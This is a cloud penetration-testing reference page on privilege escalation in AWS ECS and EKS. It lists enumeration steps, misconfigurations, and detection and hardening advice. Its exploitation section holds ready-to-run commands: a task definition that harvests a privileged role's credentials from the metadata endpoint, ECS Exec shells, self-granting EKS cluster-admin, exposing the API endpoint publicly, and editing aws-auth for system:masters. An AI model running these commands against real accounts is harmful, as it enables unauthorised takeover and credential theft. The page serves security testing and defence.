---
cstg_id: CSTG-AWS-ECS-EKS-PRIVESC
title: "AWS Ecs Eks - Privilege Escalation"
provider: aws
service: ecs-eks
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - ecs:RegisterTaskDefinition
  - ecs:RunTask
  - ecs:StartTask
  - ecs:CreateService
  - ecs:UpdateService
  - ecs:ExecuteCommand
  - iam:PassRole
  - eks:CreateAccessEntry
  - eks:AssociateAccessPolicy
  - eks:UpdateClusterConfig
  - eks:CreateNodegroup
  - eks:CreateFargateProfile
  - iam:UpdateAssumeRolePolicy
tools:
  - aws-cli
  - kubectl
  - Pacu
  - peirates
  - kube-hunter
  - rbac-tool
references:
  - "https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html"
  - "https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-exec.html"
  - "https://docs.aws.amazon.com/eks/latest/userguide/access-entries.html"
  - "https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html"
  - "https://docs.aws.amazon.com/eks/latest/userguide/pod-identities.html"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation in ECS and EKS exploits the seam between AWS IAM and the container runtime. A principal that can define what a container is, where it runs, or which IAM identity it carries can frequently obtain credentials or capabilities far beyond its own. The two recurring primitives are **`iam:PassRole`** (handing a more-privileged role to a workload the attacker controls) and **control over the Kubernetes/ECS authorization model** (RBAC, `aws-auth`, EKS access entries).

This page enumerates discrete escalation paths, one per enabling permission, in the standard "### \<permission\>" form. Each path assumes an assumed-breach posture: the reader holds an AWS principal or an in-cluster identity with the named permission and seeks to reach a higher-privileged IAM role or `cluster-admin`. The attacker objective is a role/identity with materially broader access than the starting point — ideally an administrator role or `system:masters`.

## Prerequisites

- An assumed-breach AWS principal (compromised access key, SSO session, or workload role) **or** an in-cluster Kubernetes identity (a pod's service account token, a mapped IAM principal).
- The specific permission named in each subsection. Most ECS paths additionally require `iam:PassRole` over a target role whose trust policy allows `ecs-tasks.amazonaws.com`.
- For EKS Kubernetes-layer paths, network reachability to the API server and an existing RBAC/access-entry foothold (however minimal) from which to pivot.
- Enumeration of candidate target roles and bindings from [the enumeration page](../02-services/aws-ecs-eks-enum.md).

## Enumeration

Identify what the current identity can do and which targets exist:

```bash
# What can I do? (AWS side)
aws sts get-caller-identity
aws iam get-account-authorization-details 2>/dev/null   # if permitted

# Roles assumable by ECS tasks (PassRole candidates)
aws iam list-roles --query \
  "Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service=='ecs-tasks.amazonaws.com']].Arn"

# EKS access model
aws eks describe-cluster --name <cluster> --query 'cluster.accessConfig'
aws eks list-access-entries --cluster-name <cluster>

# Kubernetes side
kubectl auth can-i --list
kubectl get clusterrolebindings -o wide | grep -i 'cluster-admin\|masters'
```

## Misconfigurations & Findings

- A task-launching permission (`RunTask`, `CreateService`, `UpdateService`) combined with `iam:PassRole` over a privileged task role.
- `iam:PassRole` granted with `Resource: *` rather than scoped to specific role ARNs.
- `ecs:ExecuteCommand` (ECS Exec) enabled on services running privileged task roles, giving interactive shells into containers carrying those roles.
- `eks:CreateAccessEntry` + `eks:AssociateAccessPolicy` without guardrails — self-grant of `AmazonEKSClusterAdminPolicy`.
- Write access to the `aws-auth` ConfigMap (Kubernetes `update`/`patch` on `configmaps` in `kube-system`).
- A pod with an over-privileged IRSA/Pod Identity role plus the ability to schedule pods onto its service account.
- `iam:UpdateAssumeRolePolicy` over a privileged role (assume-role trust hijack — applicable to any role, including ECS/EKS roles).

## Exploitation

### ecs:RegisterTaskDefinition + ecs:RunTask + iam:PassRole

The canonical ECS escalation. The attacker authors a task definition that exfiltrates the credentials of any role they can pass, then runs it.

```bash
# 1. Register a task that prints its task-role credentials to logs (or exfiltrates them)
aws ecs register-task-definition \
  --family pe \
  --requires-compatibilities FARGATE --network-mode awsvpc \
  --cpu 256 --memory 512 \
  --task-role-arn arn:aws:iam::<acct>:role/<privileged-role> \
  --execution-role-arn arn:aws:iam::<acct>:role/<exec-role> \
  --container-definitions '[{
    "name":"x","image":"public.ecr.aws/docker/library/amazonlinux:latest",
    "essential":true,
    "command":["sh","-c","curl -s 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI; sleep 600"],
    "logConfiguration":{"logDriver":"awslogs","options":{
      "awslogs-group":"/pe","awslogs-region":"<region>","awslogs-stream-prefix":"pe"}}}]'

# 2. Run it; the task assumes <privileged-role>
aws ecs run-task --cluster <cluster> --launch-type FARGATE \
  --task-definition pe \
  --network-configuration 'awsvpcConfiguration={subnets=[<subnet>],assignPublicIp=ENABLED}'
```

The task assumes `<privileged-role>` and its temporary credentials are reachable at the ECS task metadata endpoint (`169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`). The container can be made to POST those credentials to an attacker endpoint, or they can be read from CloudWatch Logs. Escalation succeeds whenever `<privileged-role>` is more powerful than the calling principal.

### ecs:StartTask + iam:PassRole

Equivalent to `RunTask` on the EC2 launch type — places the task (carrying the passed role) on a specific container instance. Same credential-harvest payload applies; additionally the chosen host's instance-profile role becomes reachable if the task can hit the host IMDS.

### ecs:CreateService / ecs:UpdateService + iam:PassRole

For long-lived access, define a service rather than a one-shot task. `UpdateService` on an existing service lets the attacker swap in a malicious task definition revision that carries a more-privileged `taskRoleArn`, persisting the escalation across restarts.

```bash
aws ecs update-service --cluster <cluster> --service <svc> \
  --task-definition pe --force-new-deployment
```

### ecs:ExecuteCommand (ECS Exec)

If ECS Exec is enabled on a service whose tasks run a privileged role, the attacker opens an interactive shell directly inside a running container and inherits that container's task-role credentials with no need to register anything.

```bash
aws ecs execute-command --cluster <cluster> --task <task-id> \
  --container <name> --interactive --command "/bin/sh"
# inside the container:
curl -s 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### iam:PassRole

`PassRole` is the lynchpin: it is what every ECS path above relies on. Granted with `Resource: *`, it lets the attacker attach the most privileged ECS-assumable role in the account to their workload. Always pair this finding with whichever task-launch permission is present. Scoped (`Resource` = specific ARNs) it only enables passing those roles.

### eks:CreateAccessEntry + eks:AssociateAccessPolicy

When the cluster uses `API`/`API_AND_CONFIG_MAP` auth mode, these two permissions let an IAM principal grant *itself* cluster administration with no Kubernetes RBAC interaction.

```bash
aws eks create-access-entry --cluster-name <cluster> \
  --principal-arn arn:aws:iam::<acct>:role/<my-role>

aws eks associate-access-policy --cluster-name <cluster> \
  --principal-arn arn:aws:iam::<acct>:role/<my-role> \
  --access-scope type=cluster \
  --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy

aws eks update-kubeconfig --name <cluster>
kubectl get secrets -A          # now cluster-admin
```

### eks:UpdateClusterConfig

Used to enable public endpoint access or widen `publicAccessCidrs`, and to flip authentication mode — turning a private, RBAC-locked cluster into one the attacker can reach and then escalate within via access entries.

```bash
aws eks update-cluster-config --name <cluster> \
  --resources-vpc-config endpointPublicAccess=true,publicAccessCidrs=0.0.0.0/0 \
  --access-config authenticationMode=API_AND_CONFIG_MAP
```

### eks:CreateNodegroup / eks:CreateFargateProfile + iam:PassRole

Creating a node group lets the attacker pass a privileged `nodeRole` to new worker nodes. The kubelet on those nodes obtains that role's credentials via IMDS, and joining nodes are granted the `system:nodes` group — enabling node-level access and, combined with workload scheduling, pod credential theft.

```bash
aws eks create-nodegroup --cluster-name <cluster> --nodegroup-name pe \
  --node-role arn:aws:iam::<acct>:role/<privileged-node-role> \
  --subnets <subnet> --scaling-config minSize=1,maxSize=1,desiredSize=1
```

### Kubernetes RBAC: write to aws-auth / bind privileged roles

With Kubernetes `update`/`patch` on the `aws-auth` ConfigMap (or `create` on ClusterRoleBindings), an in-cluster identity grants any IAM principal `system:masters`:

```bash
kubectl edit configmap aws-auth -n kube-system
# add under mapRoles:
#   - rolearn: arn:aws:iam::<acct>:role/<attacker-role>
#     username: admin
#     groups: [ "system:masters" ]
```

Equivalently, a service account with `pods/exec` or pod-create rights schedules a pod onto a more-privileged service account / node and harvests its IRSA/Pod Identity or node-role credentials.

### iam:UpdateAssumeRolePolicy

Over a privileged ECS task role or EKS cluster/node role, the attacker rewrites the trust policy to allow themselves (or `ecs-tasks.amazonaws.com` with their task) to assume it, then assumes it directly via STS.

## Detection & Logging

- **CloudTrail:** `ecs:RegisterTaskDefinition`, `ecs:RunTask`/`StartTask`, `ecs:CreateService`/`UpdateService`, and especially any of these immediately preceded or accompanied by `iam:PassRole` is a high-fidelity escalation signature. `eks:CreateAccessEntry`, `eks:AssociateAccessPolicy` referencing `AmazonEKSClusterAdminPolicy`, `eks:UpdateClusterConfig` enabling public access, `eks:CreateNodegroup`, and `iam:UpdateAssumeRolePolicy` are all individually alertable. `ecs:ExecuteCommand` is logged and SSM session activity correlates.
- **EKS audit log:** writes to the `aws-auth` ConfigMap, creation of ClusterRoleBindings to `cluster-admin`/`system:masters`, and `pods/exec` on privileged namespaces appear in the Kubernetes audit log.
- **GuardDuty:** `PrivilegeEscalation:Kubernetes/PrivilegedContainer`, `Policy:Kubernetes/AdminAccessToDefaultServiceAccount`, and IAM anomaly findings flag several of these paths.
- A new task definition whose container command contains `169.254.170.2` or `curl`/`wget` to the credentials endpoint is a strong indicator of credential harvesting.

## Remediation & Hardening

- Scope `iam:PassRole` to specific role ARNs and pair it with an `iam:PassedToService` condition limiting it to `ecs-tasks.amazonaws.com`.
- Separate the permission to register/run tasks from the ability to choose arbitrary task roles; use permission boundaries on roles that ECS can assume.
- Disable ECS Exec on production services, or restrict `ecs:ExecuteCommand` and require session logging to encrypted CloudWatch/S3.
- Treat `eks:CreateAccessEntry`/`eks:AssociateAccessPolicy`/`eks:UpdateClusterConfig` as administrative; restrict to break-glass roles and alert on use.
- Make EKS endpoints private; deny `publicAccessCidrs=0.0.0.0/0` via SCP.
- Lock the `aws-auth` ConfigMap with tight RBAC; prefer access entries over the ConfigMap; never bind `system:masters` broadly.
- Apply least privilege to node roles and IRSA roles; enforce IMDSv2 and pod-to-IMDS network policy so workloads cannot steal node credentials.
- Restrict `iam:UpdateAssumeRolePolicy` and monitor trust-policy changes on all container-related roles.

## Tools

- `aws-cli` — drives all ECS/EKS escalation API calls.
- `kubectl` — RBAC manipulation and pod scheduling.
- `Pacu` — automated AWS privilege-escalation modules, including PassRole abuse.
- `peirates` — Kubernetes/EKS in-cluster attack toolkit (token theft, IRSA abuse).
- `kube-hunter` — discovers exploitable Kubernetes weaknesses.
- `rbac-tool` — visualizes and audits RBAC bindings to find escalation edges.

## References

- ECS task IAM roles — https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html
- ECS Exec — https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-exec.html
- EKS access entries — https://docs.aws.amazon.com/eks/latest/userguide/access-entries.html
- IAM roles for service accounts — https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html
- EKS Pod Identities — https://docs.aws.amazon.com/eks/latest/userguide/pod-identities.html
- IAM privilege escalation — https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
- AWS privilege escalation methods — https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
